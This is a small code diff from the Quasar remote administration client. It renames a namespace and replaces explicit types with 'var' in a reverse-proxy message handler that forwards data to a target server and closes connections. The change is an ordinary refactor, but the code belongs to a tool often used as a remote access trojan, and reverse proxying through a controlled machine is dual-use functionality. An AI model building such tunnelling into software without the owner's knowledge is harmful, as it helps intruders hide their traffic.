@@ -4,7 +4,7 @@ using Quasar.Common.Messages;
 using Quasar.Common.Messages.ReverseProxy;
 using Quasar.Common.Networking;
 
-namespace Quasar.Client.Messages
+namespace Quasar.Client.MessageHandlers
 {
     public class ReverseProxyHandler : IMessageProcessor
     {
@@ -44,13 +44,13 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, ReverseProxyData message)
         {
-            ReverseProxyClient proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);
+            var proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);
 
             proxyClient?.SendToTargetServer(message.Data);
         }
         private void Execute(ISender client, ReverseProxyDisconnect message)
         {
-            ReverseProxyClient socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);
+            var socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);
 
             socksClient?.Disconnect();
         }
